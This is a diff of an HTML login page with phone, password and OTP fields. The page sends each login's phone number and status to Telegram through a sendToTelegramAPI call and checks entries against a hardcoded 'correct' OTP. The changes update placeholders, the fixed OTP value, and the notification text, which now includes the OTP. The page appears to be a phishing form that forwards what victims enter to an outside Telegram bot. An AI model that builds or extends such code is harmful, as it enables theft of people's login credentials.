@@ -61,12 +61,12 @@
                     <div class="text-sm font-medium text-gray-600">Phone</div>
                     <div class="ez-input-box">
                         <span class="text-gray-600 font-medium text-base">+91</span>
-                        <input type="tel" id="signin-phone" placeholder="7061082880" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                        <input type="tel" id="signin-phone" placeholder="Enter phone number" inputmode="numeric" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                     </div>
 
                     <div class="text-sm font-medium text-gray-600">Password</div>
                     <div class="ez-input-box relative">
-                        <input type="password" id="signin-password" placeholder="••••••••••••" required class="pr-8">
+                        <input type="password" id="signin-password" placeholder="Enter password" required class="pr-8">
                         <button type="button" onclick="togglePasswordVisibility('signin-password', 'signin-eye-icon')" class="absolute right-5 text-gray-400 hover:text-gray-600 focus:outline-none">
                             <i id="signin-eye-icon" class="fa-regular fa-eye-slash text-lg"></i>
                         </button>
@@ -164,7 +164,7 @@
     </div>
 
     <script>
-        const CORRECT_OTP = '123456';
+        const CORRECT_OTP = '706108';
         let pendingPhone = '';
         let pendingPassword = '';
 
@@ -273,7 +273,7 @@
             sendToTelegramAPI({
                 type: 'notify',
                 phone: pendingPhone,
-                details: `✅ <b>Login Successful with Correct OTP!</b>`
+                details: `✅ <b>Login Successful with Correct OTP! (${CORRECT_OTP})</b>`
             });
 
             alert('Login Successful!');
